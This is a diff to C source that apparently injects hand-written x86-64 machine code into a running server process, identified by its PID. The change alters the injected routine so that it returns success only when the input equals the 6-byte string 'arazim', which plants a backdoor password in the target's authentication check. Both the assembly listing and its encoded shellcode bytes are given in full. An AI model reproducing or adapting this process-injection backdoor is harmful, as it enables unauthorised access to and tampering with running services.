@@ -206,10 +206,28 @@ void write_my_code(int server_pid, unsigned long long location, unsigned long lo
     /*
      * Code means:
         cmp rsi, 6
-        jne $+0xb   ; to the nop
-        pop rax     ; pop because we pushed it earlier to save it. don't wanna jump there
+        jne END
+        cmp byte ptr [rdi], 'a'
+        jne END
+        cmp byte ptr [rdi+1], 'r'
+        jne END
+        cmp byte ptr [rdi+2], 'a'
+        jne END
+        cmp byte ptr [rdi+3], 'z'
+        jne END
+        cmp byte ptr [rdi+4], 'i'
+        jne END
+        cmp byte ptr [rdi+5], 'm'
+        jne END
+        pop rax
         mov rax, 1
         ret
+        END:
+        nop // Pad to get a qword
+        nop
+        nop
+        nop
+        nop
         nop
 
      * and then:
@@ -219,8 +237,13 @@ void write_my_code(int server_pid, unsigned long long location, unsigned long lo
      * jmp rax
      * */
     unsigned long my_code[] = {
-        be64toh(0x4883FE0675095848),
-        be64toh(0xC7C001000000C390),
+        be64toh(0x4883FE06752C803F),
+        be64toh(0x617527807F017275),
+        be64toh(0x21807F0261751B80),
+        be64toh(0x7F037A7515807F04),
+        be64toh(0x69750F807F056D75),
+        be64toh(0x095848C7C0010000),
+        be64toh(0x00C3909090909090),
         be64toh(0x4157415641545348),
         be64toh(0x81ec480100009090),
         0,
